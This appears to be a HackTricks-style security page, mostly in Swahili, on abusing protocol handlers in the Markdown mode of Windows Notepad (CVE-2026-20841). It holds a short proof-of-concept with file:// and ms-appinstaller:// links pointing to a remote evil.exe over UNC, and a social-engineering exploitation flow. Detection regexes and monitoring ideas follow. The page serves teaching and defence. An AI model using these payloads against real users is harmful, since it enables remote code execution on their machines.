# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Modern Windows applications zinazorender Markdown/HTML mara nyingi hubadilisha links zinazotolewa na mtumiaji kuwa elements zinazoweza kubofya na kuzikabidhi kwa `ShellExecuteExW`. Bila scheme allowlisting kali, protocol handler yoyote iliyosajiliwa (kwa mfano, `file:`, `ms-appinstaller:`) inaweza kuanzishwa, na kusababisha code execution katika user context ya sasa.<sup>[[1]](#references)</sup>

## ShellExecuteExW surface katika Windows Notepad Markdown mode
- Notepad huchagua Markdown mode **kwa extensions za `.md` pekee** kupitia fixed string comparison katika `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Markdown links zinazotumika:
- Standard: `[text](target)`
- Autolink: `<target>` (hutoa `[target](target)`), kwa hiyo syntaxes zote mbili ni muhimu kwa payloads na detections.
- Link clicks hushughulikiwa katika `sub_140170F60()`, ambayo hufanya filtering dhaifu kisha kuita `ShellExecuteExW`.
- `ShellExecuteExW` hutuma kwa **protocol handler yoyote iliyosanidiwa**, si HTTP(S) pekee.<sup>[[1]](#references)</sup>

### Payload considerations
- Sequences zozote za `\\` katika link **hubadilishwa kuwa `\`** kabla ya `ShellExecuteExW`, jambo linaloathiri UNC/path crafting na detection.
- Files za `.md` **hazihusishwi na Notepad kwa default**; victim lazima bado afungue file katika Notepad na abonyeze link, lakini baada ya kurenderiwa, link inaweza kubofya.
- Schemes hatari za mfano:<sup>[[1]](#references)</sup>
- `file://` kuzindua local/UNC payload.
- `ms-appinstaller://` kuanzisha App Installer flows. Schemes nyingine zilizosajiliwa locally zinaweza pia kutumiwa vibaya.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Mtiririko wa Exploitation
1. Unda faili la **`.md`** ili Notepad ilionyeshe kama Markdown.
2. Pachika kiungo ukitumia URI scheme hatari (`file:`, `ms-appinstaller:`, au handler yoyote iliyosakinishwa).
3. Wasilisha faili (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB au inayofanana) na mshawishi mtumiaji kulifungua katika Notepad.
4. Mtumiaji anapobofya, **kiungo kilichonormalishwa** hukabidhiwa kwa `ShellExecuteExW`, na protocol handler inayolingana hu-execute maudhui yaliyorejelewa katika context ya mtumiaji.<sup>[[1]](#references)[[2]](#references)</sup>

## Mawazo ya Detection
- Fuatilia uhamishaji wa mafaili ya `.md` kupitia ports/protocols zinazotumika kwa kawaida kuwasilisha nyaraka: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Changanua viungo vya Markdown (standard na autolink) na utafute `file:` au `ms-appinstaller:` bila kujali **case**.
- Regexes zilizoongozwa na vendors za kugundua ufikiaji wa remote resources:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Tabia ya **Patch** inaripotiwa kuweka **allowlist** ya faili za ndani na **HTTP(S)**; kitu kingine chochote kinachofikia `ShellExecuteExW` kinatia shaka. Panua **detections** kwa **protocol handlers** nyingine zilizosakinishwa inapohitajika, kwa kuwa **attack surface** hutofautiana kulingana na mfumo.<sup>[[1]](#references)</sup>

## Marejeo
- [1] [CVE-2026-20841: Arbitrary Code Execution katika Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
